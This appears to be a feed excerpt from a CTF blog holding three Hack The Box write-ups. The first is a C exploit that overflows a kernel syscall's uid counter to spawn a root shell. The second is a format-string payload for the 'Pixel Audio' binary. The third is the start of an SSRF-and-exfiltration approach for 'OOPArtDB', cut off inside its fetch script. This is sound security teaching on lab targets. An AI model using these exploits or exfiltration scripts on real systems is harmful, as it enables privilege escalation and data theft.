&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_unlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic_lock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This function sets the default username and password to &lt;code>root:password&lt;/code>.
It also defines a &lt;code>MagicUser*&lt;/code> called root.
Then &lt;code>kzalloc&lt;/code> is called and the resulting pointer is assigned to &lt;code>root&lt;/code>.
From my understanding, &lt;code>kzalloc&lt;/code> will allocate a chunk and initialize its memory to zero.
An important thing to note here is that this allocation will need to be freed at some point.
Anyways, this function pretty much sets the first user to be root, then creates an allocation for the next user, who will be the child of this root user.&lt;/p>
&lt;p>Now lets look at the individual actions we can get this syscall to perform.
Lets start with adding a user with &lt;code>long do_add(char* username, char* password)&lt;/code>.
First it checks if the user that will be added exists.
This is done by just iterating over the list of users, and checking the username against the supplied username.
Then an empty entry in the user list is found, which is where the new user will be added.
This works similar to the find function, where the user list is iterated over until a null entry is found, and that index is returned.
Then a search for the current user is conducted, but this time by uuid.
Again, this is just a simple for loop that compares uid, nothing special.
Then it will locate an empty slot in the current users child list.
Then another call to &lt;code>kzalloc&lt;/code> for the new user.
And the next user is given the &lt;code>nextId&lt;/code> value, which will be +1 from the previous.
We should note, that in no other function is there something to decrement the &lt;code>nextId&lt;/code> value, meaning it will always increase.
Maybe we could just create new users until we overflow the &lt;code>uid&lt;/code> value to be 0 again?
Seems possible, cuz &lt;code>nextId&lt;/code> is an unsigned short (2 bytes), so thats a total of &lt;code>0xFFFF&lt;/code> values.
Once we obtain that UUID, it would seem that some other values are changed, and then we obtain the privileges of the user with that UUID.
So if we get UUID 0, then we get the privileges of the root user.
Here is my exploit.
After compiling, I gzipped it, then copied it over to the victim machine with base64 encoding.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/syscall.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define MAGIC_SYS 449
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">long&lt;/span> &lt;span class="n">uuid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mh">0xFFFFFFFF&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Create the user
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">uuid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uuid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">shell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">execve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Delete the user
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">musl-gcc -static -march&lt;span class="o">=&lt;/span>x86-64 -Os expl.c -o expl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>HTB PWN Pixel Audio</title><link>https://Kvn11.github.io/p/htb-pwn-pixel-audio/</link><pubDate>Sat, 30 Mar 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-pwn-pixel-audio/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/hackthebox.jpg" alt="Featured image of post HTB PWN Pixel Audio" />&lt;h2 id="locating-vulnerability">Locating Vulnerability
&lt;/h2>&lt;p>The challenge consists of a web server that allows a user to upload an mp3 file, and then plays that file.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1.png"
width="1914"
height="925"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1_hu06ec495d0ffaf5631a000547eb0305d9_431452_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1_hu06ec495d0ffaf5631a000547eb0305d9_431452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Really cool pixel art"
class="gallery-image"
data-flex-grow="206"
data-flex-basis="496px"
>&lt;/p>
&lt;p>Next, it is time to reverse engineer the application in binary ninja.
The code is pretty straightforward, there is a check to see if the uploaded file is an mp3.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2.png"
width="699"
height="212"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2_hu9f4325e5d403d4a98f25bc8d760472f8_29692_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2_hu9f4325e5d403d4a98f25bc8d760472f8_29692_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Main function"
class="gallery-image"
data-flex-grow="329"
data-flex-basis="791px"
> &lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3.png"
width="978"
height="755"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3_hua8eeac607b37540438f8b4657d960e0f_135451_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3_hua8eeac607b37540438f8b4657d960e0f_135451_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="mp3 check"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="310px"
>&lt;/p>
&lt;p>In the mp3 check, there seems to be some &amp;ldquo;beta&amp;rdquo; functionality, which is where the code to reveal the flag is.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4.png"
width="653"
height="475"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4_hu9513bbd5b35cf3abc0916bfb6d7e2673_73829_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4_hu9513bbd5b35cf3abc0916bfb6d7e2673_73829_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Read flag"
class="gallery-image"
data-flex-grow="137"
data-flex-basis="329px"
>&lt;/p>
&lt;p>We need to change two of the variables to different values in order to trigger the beta function.
There are 2 &lt;code>freads&lt;/code> that occur in this function.
Both read from the mp3 file we upload.
The first one is a read of 3 bytes, which is meant to obtain the magic bytes of the file.
The magic bytes need to be the string &lt;code>ID3&lt;/code>.&lt;/p>
&lt;p>The second read is of size &lt;code>0x16&lt;/code> bytes, and is interesting because the read bytes are later printed via a &lt;code>printf&lt;/code> statement.
This makes me think that we could do a write via a format string vulnerability.
At this point, I don&amp;rsquo;t know if there is an overflow in any of the &lt;code>fread&lt;/code> calls, but we know that there is a pointer to the two values we need to change, which we can catch with a format string exploit, and then we can write a specific value to those addresses using a format string payload.
The next step is to verify these vulnerabilities with a debugger.&lt;/p>
&lt;h2 id="verifying-vulnerability">Verifying vulnerability
&lt;/h2>&lt;p>I built a PoC payload using the correct magic bytes, and used a cyclic pattern of &lt;code>0x16&lt;/code> bytes incase there is an overflow.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5.png"
width="639"
height="98"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5_hu4b8b32b8f90ead5aec753d373c4aeab8_11443_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5_hu4b8b32b8f90ead5aec753d373c4aeab8_11443_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="First payload"
class="gallery-image"
data-flex-grow="652"
data-flex-basis="1564px"
>&lt;/p>
&lt;p>Since we have a specific libc to use, we have to use the following command to run the binary:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LD_LIBRARY_PATH&lt;/span>&lt;span class="o">=&lt;/span>/path/to/glibc &lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>/path/to/glibc/libc.so.6 ./main
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Additionally the file is being called as &lt;code>/tmp/test.mp3&lt;/code> so we need to change the name and location of our PoC.&lt;/p>
&lt;p>Behaviour is as expected, no obvious overflow since stack cookie fail was not triggered.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6.png"
width="1282"
height="140"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6_hu930e229343703a4f01e6d281c9f62a09_22452_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6_hu930e229343703a4f01e6d281c9f62a09_22452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Def a format string challenge"
class="gallery-image"
data-flex-grow="915"
data-flex-basis="2197px"
>&lt;/p>
&lt;p>Checking out a generic format string payload in GDB, I was also able to verify that there was no overflow.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7.png"
width="492"
height="174"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7_hu097f2cd7903bd3f625b2e1d0be7eb769_34256_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7_hu097f2cd7903bd3f625b2e1d0be7eb769_34256_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Format string vuln for sure"
class="gallery-image"
data-flex-grow="282"
data-flex-basis="678px"
>&lt;/p>
&lt;p>The payload starts at &lt;code>0x7fffffffdbd0&lt;/code>, and isn&amp;rsquo;t enough to overwrite not even the stack cookie, which is at &lt;code>0x7fffffffdbe8&lt;/code>
So at this point I am confident that this is just a format string vuln.
I am able to get the pointers to the values that need to change by referencing the 12th and 13th values on the stack: &lt;code>%12$p.%13$p&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8.png"
width="501"
height="170"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8_hu8ddf742e0b9de11dcad6aafde7b78388_32877_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8_hu8ddf742e0b9de11dcad6aafde7b78388_32877_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="The two addresses we need to write to."
class="gallery-image"
data-flex-grow="294"
data-flex-basis="707px"
>&lt;/p>
&lt;h2 id="exploit">Exploit
&lt;/h2>&lt;p>Since we now know where to write, we can craft our write.
The first write will be for 48879, and the second for 495.
The reason for this is that the after the first write (48879 = &lt;code>beef&lt;/code>), then we need to subtract that write from the second (49374 = &lt;code>c0de&lt;/code>).
So the payload becomes: &lt;code>ID3%48879x%12$n%495x%13$n&lt;/code>, which fits perfectly in our 22 byte restriction.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9.png"
width="596"
height="148"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9_hu429ba7417812e238fd3732a417f428f9_17964_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9_hu429ba7417812e238fd3732a417f428f9_17964_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Before printf"
class="gallery-image"
data-flex-grow="402"
data-flex-basis="966px"
> &lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10.png"
width="612"
height="146"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10_hub12dd15de3bf2c36f3b2c9725ede9a4e_17416_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10_hub12dd15de3bf2c36f3b2c9725ede9a4e_17416_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="After printf"
class="gallery-image"
data-flex-grow="419"
data-flex-basis="1006px"
>&lt;/p>
&lt;p>And that works just fine:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11.png"
width="689"
height="533"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11_hu50d0e1deab3dd5ecad5bcfc8ad441c5e_80265_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11_hu50d0e1deab3dd5ecad5bcfc8ad441c5e_80265_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Flag"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="310px"
>&lt;/p></description></item><item><title>HTB Insane Web OOPArtDB</title><link>https://Kvn11.github.io/p/htb-insane-web-oopartdb/</link><pubDate>Tue, 20 Feb 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-insane-web-oopartdb/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/hackthebox.jpg" alt="Featured image of post HTB Insane Web OOPArtDB" />&lt;h2 id="intro">Intro
&lt;/h2>&lt;p>This challenge allows you to submit a URL to be &amp;ldquo;scanned&amp;rdquo; by a bot on the challenge server.
The flag is shown in the webapp once you have successfully accessed the appropriate page with the credentials of the &amp;ldquo;Overseer&amp;rdquo; user.&lt;/p>
&lt;h2 id="foothold">Foothold
&lt;/h2>&lt;p>One of the first things I noticed in the source code, was the &lt;code>/debug&lt;/code> and &lt;code>/register&lt;/code> endpoint.
The &lt;code>/debug&lt;/code> endpoint caught my attention because it could reveal the secret &lt;code>REFERRAL_TOKEN&lt;/code> value which is required to register via &lt;code>/register&lt;/code> as the higher privilege &lt;code>researcher&lt;/code> type of user.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// challenge/index.js
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/debug&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">util&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isLocalhost&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">utils&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;util&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">end&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Object&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getOwnPropertyNames&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">global&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">n&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="sb">`&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">:\n&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">utils&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">inspect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">global&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;\n\n&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>When accessed via a GET request from localhost, it responds with a detailed inspection of all properties of the global object in Node.js.
It&amp;rsquo;s a way to inspect the global environment for debugging purposes.
In all honesty, at this point I couldn&amp;rsquo;t see how I could leverage this to get the flag, but it seemed like a good step up since I was obtaining higher permissions.
This is probably something I need to work on for the future.
This is clearly SSRF, but we can&amp;rsquo;t see the output of the response, so we also need to combine it with a way to exfiltrate the response.
So then my next thought was to submit a URL I control.
The URL will contain a webpage that contains a script that will make a request to the &lt;code>/debug&lt;/code> endpoint, and then submit the response from that request back to my own web server.&lt;/p>
&lt;p>I hosted a web page on an EC2 instance, and had the following script run on it:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">function&lt;/span> &lt;span class="nx">fetchData&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://localhost/debug&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ok&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Network response was not ok&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">text&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="c1">// Return the response as text
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">error&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
